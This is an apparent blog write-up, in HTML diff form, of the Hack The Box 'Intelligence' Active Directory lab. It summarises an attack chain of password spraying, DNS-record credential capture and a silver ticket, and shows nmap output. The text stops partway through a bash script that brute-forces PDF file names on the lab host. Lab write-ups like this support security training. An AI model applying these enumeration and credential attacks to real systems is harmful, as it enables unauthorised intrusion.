@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB - Intelligence — 0xma1ware</title>
+  <meta name="description" content="Intelligence was an medium-level box that showcased realistic AD-attacks.">
+  <meta name="author" content="ma1ware">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://0xma1ware.github.io/posts/intelligence.html">
+  <meta property="og:title" content="HTB - Intelligence">
+  <meta property="og:description" content="Intelligence was an medium-level box that showcased realistic AD-attacks.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://0xma1ware.github.io/posts/intelligence.html">
+  <meta property="og:image" content="https://0xma1ware.github.io/favicon.ico">
+  <meta property="article:published_time" content="2023-07-26">
+  <meta property="article:author" content="ma1ware">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@0xma1ware">
+  <meta name="twitter:title" content="HTB - Intelligence">
+  <meta name="twitter:description" content="Intelligence was an medium-level box that showcased realistic AD-attacks.">
+  <link rel="icon" href="../favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org", "@type": "BlogPosting",
+    "headline": "HTB - Intelligence", "description": "Intelligence was an medium-level box that showcased realistic AD-attacks.",
+    "datePublished": "2023-07-26",
+    "author": { "@type": "Person", "name": "ma1ware", "url": "https://github.com/0xma1ware" },
+    "publisher": { "@type": "Person", "name": "ma1ware" },
+    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://0xma1ware.github.io/posts/intelligence.html" }
+  }
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
+    <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('.site-nav').classList.toggle('open')">
+      <span></span><span></span><span></span>
+    </button>
+    <nav><ul class="site-nav">
+      <li><a href="../">home</a></li>
+      <li><a href="https://github.com/0xma1ware" target="_blank" rel="noopener">github</a></li>
+      <li><a href="https://x.com/0xma1ware" target="_blank" rel="noopener">x.com</a></li>
+    </ul></nav>
+  </header>
+
+  <div class="post-header animate-in">
+    <a href="../" class="back-link">&larr; back to all posts</a>
+    <h1>HTB - Intelligence</h1>
+    <div class="post-meta">
+      <span>2023-07-26</span>
+      <span class="category ">htb</span>
+      <span class="diff medium">medium</span>
+      <span>by ma1ware</span>
+    </div>
+    <div class="tags" style="margin-top:.75rem;"><span class="tag">web server</span><span class="tag">pdf</span><span class="tag">bruteforce</span><span class="tag">password spray</span><span class="tag">share</span><span class="tag">silver ticket</span><span class="tag">medium</span></div>
+  </div>
+
+  <article class="post-content animate-in">
+    <div class="toc"><div class="toc-title">// Table of Contents</div><ul><li class="toc-h1"><a href="#introduction">Introduction</a></li><li class="toc-h2"><a href="#nmap">Nmap</a></li><li class="toc-h2"><a href="#port-80-http-iis">Port 80 - HTTP (IIS)</a></li></ul></div>
+    <h1 id="introduction">Introduction</h1>
+<p>Intelligence was an medium-level box that showcased realistic AD-attacks. </p>
+<p>Initially we find a web-server with two pdfs in the format of 2020-Month-Day so we create a bruteforce script to download any other pdfs not linked directly. After this we extract a list of usernames from the pdfs as well as a default password which we then use to password spray using crackmapexec. <br />
+This returns a hit on a Tiffany.Molina who has access to the user.txt as well as to the IT share which contains a powershell script that runs every 5 minutes. We then add a DNS record using the default credentials we recovered, get a set of new credentials. Use new credentials to read the hashed password of a service-user which we can then use in a silver-ticket type of attack and impersonate the Administrator.  </p>
+<hr />
+<h2 id="nmap">Nmap</h2>
+<p>Ports tcp open in nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>PORT<span style="color: #F8F8F2">    </span>STATE<span style="color: #F8F8F2"> </span>SERVICE<span style="color: #F8F8F2">      </span>REASON
+<span style="color: #AE81FF">53</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>domain<span style="color: #F8F8F2">       </span>syn-ack
+<span style="color: #AE81FF">80</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">         </span>syn-ack
+<span style="color: #AE81FF">88</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>kerberos-sec<span style="color: #F8F8F2"> </span>syn-ack
+<span style="color: #AE81FF">135</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>syn-ack
+<span style="color: #AE81FF">139</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>netbios-ssn<span style="color: #F8F8F2">  </span>syn-ack
+<span style="color: #AE81FF">389</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">         </span>syn-ack
+<span style="color: #AE81FF">445</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>microsoft-ds<span style="color: #F8F8F2"> </span>syn-ack
+</code></pre></div>
+
+<p>Ports services and versions nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Nmap 7.93 scan initiated Tue Jul 25 12:45:23 2023 as: nmap -sC -sV -p 49691,62696,49666,3268,49711,139,135,53,445,5985,80,636,3269,49692,9389,464,593,49717,88,389 -oA scans/Intelligence -vv 10.129.156.112</span>
+Nmap<span style="color: #F8F8F2"> </span>scan<span style="color: #F8F8F2"> </span>report<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112
+Host<span style="color: #F8F8F2"> </span>is<span style="color: #F8F8F2"> </span>up,<span style="color: #F8F8F2"> </span>received<span style="color: #F8F8F2"> </span>syn-ack<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span><span style="color: #AE81FF">0</span>.28s<span style="color: #F8F8F2"> </span>latency<span style="color: #FF4689">)</span>.
+Scanned<span style="color: #F8F8F2"> </span>at<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>:45:23<span style="color: #F8F8F2"> </span>EDT<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>106s
+
+PORT<span style="color: #F8F8F2">      </span>STATE<span style="color: #F8F8F2"> </span>SERVICE<span style="color: #F8F8F2">       </span>REASON<span style="color: #F8F8F2">  </span>VERSION
+<span style="color: #AE81FF">53</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>domain<span style="color: #F8F8F2">        </span>syn-ack<span style="color: #F8F8F2"> </span>Simple<span style="color: #F8F8F2"> </span>DNS<span style="color: #F8F8F2"> </span>Plus
+<span style="color: #AE81FF">80</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">          </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>IIS<span style="color: #F8F8F2"> </span>httpd<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.0
+<span style="color: #F8F8F2">|</span>_http-server-header:<span style="color: #F8F8F2"> </span>Microsoft-IIS/10.0
+<span style="color: #F8F8F2">|</span>_http-favicon:<span style="color: #F8F8F2"> </span>Unknown<span style="color: #F8F8F2"> </span>favicon<span style="color: #F8F8F2"> </span>MD5:<span style="color: #F8F8F2"> </span>556F31ACD686989B1AFCF382C05846AA
+<span style="color: #F8F8F2">|</span>_http-title:<span style="color: #F8F8F2"> </span>Intelligence
+<span style="color: #F8F8F2">| </span>http-methods:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>Supported<span style="color: #F8F8F2"> </span>Methods:<span style="color: #F8F8F2"> </span>OPTIONS<span style="color: #F8F8F2"> </span>TRACE<span style="color: #F8F8F2"> </span>GET<span style="color: #F8F8F2"> </span>HEAD<span style="color: #F8F8F2"> </span>POST
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>Potentially<span style="color: #F8F8F2"> </span>risky<span style="color: #F8F8F2"> </span>methods:<span style="color: #F8F8F2"> </span>TRACE
+<span style="color: #AE81FF">88</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>kerberos-sec<span style="color: #F8F8F2">  </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Kerberos<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>server<span style="color: #F8F8F2"> </span>time:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">23</span>:45:31Z<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">135</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">139</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>netbios-ssn<span style="color: #F8F8F2">   </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>netbios-ssn
+<span style="color: #AE81FF">389</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">          </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>intelligence.htb0.,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25T23:47:07+00:00<span style="color: #F8F8F2">; </span>+7h00m01s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Subject<span style="color: #F8F8F2"> </span>Alternative<span style="color: #F8F8F2"> </span>Name:<span style="color: #F8F8F2"> </span>othername:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span style="color: #F8F8F2"> </span>DNS:dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Issuer:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>intelligence-DC-CA/domainComponent<span style="color: #FF4689">=</span>intelligence
+<span style="color: #AE81FF">445</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>microsoft-ds?<span style="color: #F8F8F2"> </span>syn-ack
+<span style="color: #AE81FF">464</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>kpasswd5?<span style="color: #F8F8F2">     </span>syn-ack
+<span style="color: #AE81FF">593</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ncacn_http<span style="color: #F8F8F2">    </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC<span style="color: #F8F8F2"> </span>over<span style="color: #F8F8F2"> </span>HTTP<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.0
+<span style="color: #AE81FF">636</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ssl/ldap<span style="color: #F8F8F2">      </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>intelligence.htb0.,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25T23:47:08+00:00<span style="color: #F8F8F2">; </span>+7h00m01s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Subject<span style="color: #F8F8F2"> </span>Alternative<span style="color: #F8F8F2"> </span>Name:<span style="color: #F8F8F2"> </span>othername:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span style="color: #F8F8F2"> </span>DNS:dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Issuer:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>intelligence-DC-CA/domainComponent<span style="color: #FF4689">=</span>intelligence
+<span style="color: #AE81FF">3268</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">          </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>intelligence.htb0.,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25T23:47:07+00:00<span style="color: #F8F8F2">; </span>+7h00m01s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Subject<span style="color: #F8F8F2"> </span>Alternative<span style="color: #F8F8F2"> </span>Name:<span style="color: #F8F8F2"> </span>othername:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span style="color: #F8F8F2"> </span>DNS:dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Issuer:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>intelligence-DC-CA/domainComponent<span style="color: #FF4689">=</span>intelligence
+<span style="color: #AE81FF">3269</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ssl/ldap<span style="color: #F8F8F2">      </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>intelligence.htb0.,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25T23:47:08+00:00<span style="color: #F8F8F2">; </span>+7h00m01s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Subject<span style="color: #F8F8F2"> </span>Alternative<span style="color: #F8F8F2"> </span>Name:<span style="color: #F8F8F2"> </span>othername:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.3.6.1.4.1.311.25.1::&lt;unsupported&gt;,<span style="color: #F8F8F2"> </span>DNS:dc.intelligence.htb
+<span style="color: #F8F8F2">| </span>Issuer:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>intelligence-DC-CA/domainComponent<span style="color: #FF4689">=</span>intelligence
+<span style="color: #F8F8F2">| </span>Public<span style="color: #F8F8F2"> </span>Key<span style="color: #F8F8F2"> </span>type:<span style="color: #F8F8F2"> </span>rsa
+<span style="color: #AE81FF">5985</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">          </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>HTTPAPI<span style="color: #F8F8F2"> </span>httpd<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span>.0<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SSDP/UPnP<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_http-server-header:<span style="color: #F8F8F2"> </span>Microsoft-HTTPAPI/2.0
+<span style="color: #F8F8F2">|</span>_http-title:<span style="color: #F8F8F2"> </span>Not<span style="color: #F8F8F2"> </span>Found
+<span style="color: #AE81FF">9389</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>mc-nmf<span style="color: #F8F8F2">        </span>syn-ack<span style="color: #F8F8F2"> </span>.NET<span style="color: #F8F8F2"> </span>Message<span style="color: #F8F8F2"> </span>Framing
+<span style="color: #AE81FF">49666</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49691</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>ncacn_http<span style="color: #F8F8F2">    </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC<span style="color: #F8F8F2"> </span>over<span style="color: #F8F8F2"> </span>HTTP<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.0
+<span style="color: #AE81FF">49692</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49711</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49717</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">62696</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">         </span>syn-ack<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+Service<span style="color: #F8F8F2"> </span>Info:<span style="color: #F8F8F2"> </span>Host:<span style="color: #F8F8F2"> </span>DC<span style="color: #F8F8F2">; </span>OS:<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2">; </span>CPE:<span style="color: #F8F8F2"> </span>cpe:/o:microsoft:windows
+
+Host<span style="color: #F8F8F2"> </span>script<span style="color: #F8F8F2"> </span>results:
+<span style="color: #F8F8F2">| </span>smb2-time:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-25T23:46:28
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>start_date:<span style="color: #F8F8F2"> </span>N/A
+<span style="color: #F8F8F2">| </span>p2p-conficker:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>Checking<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span>Conficker.C<span style="color: #F8F8F2"> </span>or<span style="color: #F8F8F2"> </span>higher...
+<span style="color: #F8F8F2">|   </span>Check<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">39536</span>/tcp<span style="color: #FF4689">)</span>:<span style="color: #F8F8F2"> </span>CLEAN<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Timeout<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|   </span>Check<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">65329</span>/tcp<span style="color: #FF4689">)</span>:<span style="color: #F8F8F2"> </span>CLEAN<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Timeout<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|   </span>Check<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">22132</span>/udp<span style="color: #FF4689">)</span>:<span style="color: #F8F8F2"> </span>CLEAN<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Timeout<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|   </span>Check<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">4</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">35934</span>/udp<span style="color: #FF4689">)</span>:<span style="color: #F8F8F2"> </span>CLEAN<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Timeout<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">0</span>/4<span style="color: #F8F8F2"> </span>checks<span style="color: #F8F8F2"> </span>are<span style="color: #F8F8F2"> </span>positive:<span style="color: #F8F8F2"> </span>Host<span style="color: #F8F8F2"> </span>is<span style="color: #F8F8F2"> </span>CLEAN<span style="color: #F8F8F2"> </span>or<span style="color: #F8F8F2"> </span>ports<span style="color: #F8F8F2"> </span>are<span style="color: #F8F8F2"> </span>blocked
+<span style="color: #F8F8F2">| </span>smb2-security-mode:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">311</span>:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>Message<span style="color: #F8F8F2"> </span>signing<span style="color: #F8F8F2"> </span>enabled<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>required
+<span style="color: #F8F8F2">|</span>_clock-skew:<span style="color: #F8F8F2"> </span>mean:<span style="color: #F8F8F2"> </span>7h00m00s,<span style="color: #F8F8F2"> </span>deviation:<span style="color: #F8F8F2"> </span>0s,<span style="color: #F8F8F2"> </span>median:<span style="color: #F8F8F2"> </span>7h00m00s
+
+Read<span style="color: #F8F8F2"> </span>data<span style="color: #F8F8F2"> </span>files<span style="color: #F8F8F2"> </span>from:<span style="color: #F8F8F2"> </span>/usr/bin/../share/nmap
+Service<span style="color: #F8F8F2"> </span>detection<span style="color: #F8F8F2"> </span>performed.<span style="color: #F8F8F2"> </span>Please<span style="color: #F8F8F2"> </span>report<span style="color: #F8F8F2"> </span>any<span style="color: #F8F8F2"> </span>incorrect<span style="color: #F8F8F2"> </span>results<span style="color: #F8F8F2"> </span>at<span style="color: #F8F8F2"> </span>https://nmap.org/submit/<span style="color: #F8F8F2"> </span>.
+<span style="color: #959077"># Nmap done at Tue Jul 25 12:47:09 2023 -- 1 IP address (1 host up) scanned in 106.20 seconds</span>
+</code></pre></div>
+
+<p>Ports UDP nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>Discovered<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2"> </span>port<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">53</span>/udp<span style="color: #F8F8F2"> </span>on<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.156.112<span style="color: #F8F8F2">                                  </span>
+</code></pre></div>
+
+<hr />
+<h2 id="port-80-http-iis">Port 80 - HTTP (IIS)</h2>
+<p><img alt="&quot;Port 80&quot;" src="../imgs/assets-intelligence/port80.png" /></p>
+<p>Downloading the two PDFs we get two usernames:<br />
+<img alt="&quot;Exiftool output&quot;" src="../imgs/assets-intelligence/exiftool.png" /></p>
+<ul>
+<li>William.Lee</li>
+<li>Jose.Williams</li>
+</ul>
+<p>As the format for PDFs is in the form of Year-Month-Day we can create a bash script to enumerate and download all available files.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077">#!/bin/bash</span>
+
+<span style="color: #F8F8F2">URL</span><span style="color: #FF4689">=</span><span style="color: #E6DB74">&quot;http://10.129.156.112/documents/&quot;</span>
+
+<span style="color: #959077"># Function to generate all possible date patterns for the year 2020</span>
+generate_date_patterns<span style="color: #FF4689">()</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">{</span>
+<span style="color: #F8F8F2">  local start_month</span><span style="color: #FF4689">=</span><span style="color: #AE81FF">1</span>
+<span style="color: #F8F8F2">  local end_month</span><span style="color: #FF4689">=</span><span style="color: #AE81FF">12</span>
+<span style="color: #F8F8F2">  local days_in_month</span><span style="color: #FF4689">=(</span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;28&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;30&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;30&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;30&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;30&quot;</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&quot;31&quot;</span><span style="color: #FF4689">)</span>
+
+<span style="color: #F8F8F2">  </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">((</span><span style="color: #F8F8F2">month </span><span style="color: #FF4689">=</span><span style="color: #F8F8F2"> </span>start_month<span style="color: #F8F8F2">; </span>month<span style="color: #F8F8F2"> </span>&lt;<span style="color: #FF4689">=</span><span style="color: #F8F8F2"> </span>end_month<span style="color: #F8F8F2">; </span>month++<span style="color: #FF4689">))</span><span style="color: #F8F8F2">; </span><span style="color: #66D9EF">do</span>
+<span style="color: #F8F8F2">    </span><span style="color: #959077"># Determine the maximum day for the current month</span>
+<span style="color: #F8F8F2">    local max_day</span><span style="color: #FF4689">=</span><span style="color: #E6DB74">&quot;${</span><span style="color: #F8F8F2">days_in_month[month - 1]</span><span style="color: #E6DB74">}&quot;</span>
+
+<span style="color: #F8F8F2">    </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">((</span><span style="color: #F8F8F2">day </span><span style="color: #FF4689">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">; </span>day<span style="color: #F8F8F2"> </span>&lt;<span style="color: #FF4689">=</span><span style="color: #F8F8F2"> </span>max_day<span style="color: #F8F8F2">; </span>day++<span style="color: #FF4689">))</span><span style="color: #F8F8F2">; </span><span style="color: #66D9EF">do</span>
